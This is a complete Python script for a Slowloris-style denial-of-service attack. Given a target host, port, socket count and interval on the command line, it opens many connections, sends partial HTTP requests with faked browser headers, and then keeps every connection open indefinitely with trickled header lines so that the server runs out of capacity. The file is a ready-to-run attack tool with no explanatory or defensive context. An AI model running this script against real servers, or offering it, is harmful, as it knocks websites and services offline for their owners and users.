#usr/bin/env python3

import sys
import random
import socket
import time
from termcolor import cprint
from tqdm import tqdm

regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
                    "Accept-language: en-US,en,q=0.5" ]

def init_socket(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip,int(port)))
    s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode('UTF-8'))

    for header in regular_headers:
        s.send(f'{header}\r\n'.encode('UTF-8'))

    return s

def main():
    if len(sys.argv)<5:
        print(f"Usage: {sys.argv[0]} example.com 80(target port) 100(socker_count) 10(time_between_successive keep-alive requests)")
        return

    ip = sys.argv[1]
    port = sys.argv[2]
    socket_count= int(sys.argv[3])
    cprint('Creating Sockets...',"yellow")
    timer = int(sys.argv[4])
    socket_list=[]

    for i in tqdm(range(int(socket_count))):
        try:
            s=init_socket(ip,port)
        except socket.error:
            break
        socket_list.append(s)

    print()

    while True:
        cprint(f"Sending Keep-Alive Headers to {len(socket_list)} connections","magenta")

        for s in socket_list:
            try:
                s.send("X-a {random.randint(1,5000)}\r\n".encode('UTF-8'))
            except socket.error:
                socket_list.remove(s)

        for _ in range(socket_count - len(socket_list)):
            cprint("Re-creating Socket...","red")
            try:
                s=init_socket(ip,port)
                if s:
                    socket_list.append(s)
            except socket.error:
                break

        time.sleep(timer)

if __name__=="__main__":
    main()
